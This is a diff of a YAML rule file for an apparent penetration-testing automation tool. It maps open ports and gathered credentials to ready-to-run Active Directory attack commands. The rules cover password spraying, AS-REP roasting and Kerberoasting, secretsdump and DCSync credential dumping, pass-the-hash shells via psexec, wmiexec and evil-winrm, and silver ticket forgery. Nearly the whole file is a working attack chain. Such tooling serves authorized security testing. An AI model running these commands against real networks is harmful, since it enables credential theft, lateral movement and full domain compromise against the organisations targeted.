@@ -1,26 +1,191 @@
-- command_template: capo run impacket-GetUserSPNs {DOMAIN}/{USER}:{PASSWORD} -dc-ip
-    {IP} -request
-  conditions:
-    require_ports:
-    - 88
-    require_state:
-    - has_domain
-    - has_valid_user
-    - has_valid_password
-  description: Extract TGS tickets for offline cracking using known credentials.
-  id: kerberoast_authenticated
-  name: Kerberoasting (Authenticated)
+# ─────────────────────────────────────────────────
+# Active Directory attack chain rules
+# Fires when sufficient state (ports + creds/users/domain) is present
+# ─────────────────────────────────────────────────
+
+# ── Unauthenticated ──────────────────────────────
+
+- id: ad_anonymous_ldap
+  name: LDAP Anonymous Bind
+  description: Attempt anonymous LDAP queries to extract naming contexts, users, and groups.
   priority: P1
-  source_reference: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
-- command_template: capo nxc smb -u "{USERFILE}" -p "{PASSFILE}" --continue-on-success
   conditions:
-    require_ports:
-    - 445
-    require_state:
-    - has_valid_user
-    - has_valid_password
-  description: Enumerate SMB shares and privileges with real credentials.
-  id: smb_enum_authenticated
-  name: Authenticated SMB Enumeration
-  priority: P2
+    require_ports: [389]
+  command_template: ldapsearch -x -H ldap://{IP} -b '' -s base namingContexts
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
+
+- id: ad_rid_brute
+  name: RID Brute-Force (Null Session)
+  description: Enumerate domain users via RID cycling without credentials.
+  priority: P1
+  conditions:
+    require_ports: [445]
+  command_template: capo nxc rid-brute
   source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+
+- id: ad_null_session
+  name: SMB Null Session
+  description: Test null session access for share and user enumeration.
+  priority: P1
+  conditions:
+    require_ports: [445]
+  command_template: capo nxc null
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+
+- id: ad_guest_session
+  name: SMB Guest Session
+  description: Test guest account access for share enumeration.
+  priority: P2
+  conditions:
+    require_ports: [445]
+  command_template: capo nxc guest
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+
+# ── Requires users (no password yet) ────────────
+
+- id: asrep_roast_no_preauth
+  name: AS-REP Roasting (No Pre-Auth)
+  description: Find accounts without Kerberos pre-auth and request roastable AS-REP hashes.
+  priority: P1
+  conditions:
+    require_ports: [88]
+    require_state: [has_domain, has_valid_user]
+  command_template: impacket-GetNPUsers {DOMAIN}/ -usersfile {USERFILE} -dc-ip {IP} -format hashcat
+  source_reference: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast
+
+- id: kerbrute_userenum
+  name: Kerberos User Enumeration
+  description: Validate usernames against the DC via Kerberos without triggering lockout.
+  priority: P2
+  conditions:
+    require_ports: [88]
+    require_state: [has_domain]
+  command_template: kerbrute userenum --dc {IP} -d {DOMAIN} {USERFILE}
+  source_reference: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
+
+- id: ad_password_spray_kerb
+  name: Kerberos Password Spray
+  description: Spray a single password against all known users via Kerberos.
+  priority: P2
+  conditions:
+    require_ports: [88]
+    require_state: [has_domain, has_valid_user]
+  command_template: kerbrute passwordspray --dc {IP} -d {DOMAIN} {USERFILE} {PASS}
+  source_reference: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying
+
+- id: ad_smb_spray
+  name: SMB Password Spray
+  description: Spray credentials via SMB using NetExec.
+  priority: P2
+  conditions:
+    require_ports: [445]
+    require_state: [has_valid_user]
+  command_template: capo nxc spray -U {USERFILE} -P {PASSFILE}
+  source_reference: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying
+
+# ── Requires credentials ─────────────────────────
+
+- id: kerberoast_authenticated
+  name: Kerberoasting (Authenticated)
+  description: Extract TGS tickets for offline cracking using known credentials.
+  priority: P1
+  conditions:
+    require_ports: [88]
+    require_state: [has_domain, has_valid_user, has_valid_password]
+  command_template: impacket-GetUserSPNs {DOMAIN}/{USER}:{PASS} -dc-ip {IP} -request
+  source_reference: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
+
+- id: smb_enum_authenticated
+  name: Authenticated SMB Enumeration
+  description: Enumerate SMB shares and privileges with real credentials.
+  priority: P2
+  conditions:
+    require_ports: [445]
+    require_state: [has_valid_user, has_valid_password]
+  command_template: capo nxc smb -u "{USER}" -p "{PASS}" --shares
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+
+- id: bloodhound_collection
+  name: BloodHound Collection
+  description: Collect AD relationships for attack path analysis using BloodHound.
+  priority: P1
+  conditions:
+    require_ports: [389]
+    require_state: [has_domain, has_valid_user, has_valid_password]
+  command_template: bloodhound-python -u {USER} -p '{PASS}' -d {DOMAIN} -dc {IP} -c all --zip
+  source_reference: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound
+
+- id: ad_ldap_enum_auth
+  name: Authenticated LDAP Enumeration
+  description: Dump users, groups, and policies via authenticated LDAP queries.
+  priority: P2
+  conditions:
+    require_ports: [389]
+    require_state: [has_domain, has_valid_user, has_valid_password]
+  command_template: nxc ldap {IP} -u {USER} -p '{PASS}' -M get-desc-users
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
+
+- id: ad_secretsdump
+  name: Secretsdump (SAM/NTDS)
+  description: Dump SAM hashes or NTDS.dit with valid credentials — high-privilege only.
+  priority: P1
+  conditions:
+    require_ports: [445]
+    require_state: [has_domain, has_valid_user, has_valid_password]
+  command_template: impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{IP}
+  source_reference: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync
+
+- id: ad_dcsync
+  name: DCSync Attack
+  description: Replicate domain credentials via MS-DRSR (requires Replicating Directory Changes).
+  priority: P1
+  conditions:
+    require_ports: [88]
+    require_state: [has_domain, has_valid_user, has_valid_password]
+  command_template: impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc
+  source_reference: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync
+
+# ── Requires hashes (pass-the-hash) ─────────────
+
+- id: pth_psexec
+  name: Pass-the-Hash — PsExec
+  description: Get a SYSTEM shell via SMB using an NTLM hash.
+  priority: P1
+  conditions:
+    require_ports: [445]
+    require_state: [has_domain]
+    jmespath: "length(hashes) > `0`"
+  command_template: capo kerberos psexec -u {USER} --hash {HASH} -d {DOMAIN}
+  source_reference: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-hash
+
+- id: pth_wmiexec
+  name: Pass-the-Hash — WMIExec
+  description: Get a semi-interactive shell via WMI using an NTLM hash (stealthier).
+  priority: P1
+  conditions:
+    require_ports: [135]
+    require_state: [has_domain]
+    jmespath: "length(hashes) > `0`"
+  command_template: capo kerberos wmiexec -u {USER} --hash {HASH} -d {DOMAIN}
+  source_reference: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-hash
+
+- id: pth_evil_winrm
+  name: Pass-the-Hash — Evil-WinRM
+  description: Get a PowerShell shell via WinRM using an NTLM hash.
+  priority: P1
+  conditions:
+    require_ports: [5985]
+    jmespath: "length(hashes) > `0`"
+  command_template: evil-winrm -i {IP} -u {USER} -H {HASH}
+  source_reference: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-hash
+
+- id: ad_silver_ticket
+  name: Silver Ticket Forge
+  description: Forge a service ticket for a specific SPN using a service account hash.
+  priority: P2
+  conditions:
+    require_ports: [88]
+    require_state: [has_domain]
+    jmespath: "length(hashes) > `0`"
+  command_template: impacket-ticketer -nthash {HASH} -domain-sid S-1-5-21-XXXXXXXXXX -domain {DOMAIN} -spn CIFS/{IP} administrator
+  source_reference: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket
